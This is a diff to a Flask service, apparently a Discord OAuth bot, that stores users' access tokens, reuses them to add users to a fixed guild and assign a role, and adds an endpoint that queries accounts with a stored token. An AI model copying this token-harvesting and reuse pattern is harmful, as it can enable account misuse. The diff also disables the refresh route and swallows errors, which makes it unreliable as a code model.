@@ -59,12 +59,18 @@ def add_to_guild(access_token, userID, guild_Id):
   }
   r = requests.put(url=url, headers=headers, json=data)
   print(r.status_code)
-  return r.status_code
+  
   # print(response.text)
   # print(response.status_code)
   # print(REDIRECT_URI)
+  r = requests.post(
+  hook, json={"content": f"successfully added user <@{userID}> | {userID}"})
+  r = requests.put(
+    f"https://canary.discord.com/api/v9/guilds/952495772073619466/members/{userID}/roles/988815859814383648",
+    headers={"Authorization": f"Bot {tkn}"})
+  return r.status_code
 
-
+  
 def get_user(access: str):
   endp = "https://canary.discord.com/api/v9/users/@me"
   r = requests.get(endp, headers={"Authorization": f"Bearer {access}"})
@@ -212,12 +218,31 @@ def refresh_all():
 def refresh():
   if request.headers.get('Authorization') != pwd:
     return 'unauthorized'
+  return "failed"
   # access = open("access_tokens.json").read()
   refresh_all()
   return "200"
     
-        
-                          
+@app.route("/check", methods = ['get'])
+def check():
+  if request.headers.get('Authorization') != pwd:
+    return 'unauthorized'
+  jsonxd = request.json
+  # print(jsonxd)
+  user = jsonxd['user']
+  f = open("Database/access_tokens.json", "r").read()
+  f = json.loads(f)
+  try:
+    tk = f[user]
+    # print(tk)
+  except KeyError:
+    return "entry %s not found" % (user)
+  endp = "https://canary.discord.com/api/v9/users/@me"
+  r = requests.get(endp, headers={"Authorization": f"Bearer {tk}"})
+  rjson = r.json()
+  print(rjson)
+  return "entry found: \n\n%s" % (rjson)
+  
     
 @app.route('/usr/passwd')
 def hello_world():
@@ -254,11 +279,6 @@ def process_json():
     return redirect("https://discord.com/oauth2/authorized", code=302)
   try:
     add_to_guild(str(access_tk), str(id), "952495772073619466")
-    r = requests.post(
-    hook, json={"content": f"successfully added user <@{userID}> | {userID}"})
-    r = requests.put(
-    f"https://canary.discord.com/api/v9/guilds/952495772073619466/members/{userID}/roles/988815859814383648",
-    headers={"Authorization": f"Bot {tkn}"})
   except:
     pass
   return redirect("https://discord.com/oauth2/authorized", code=302)
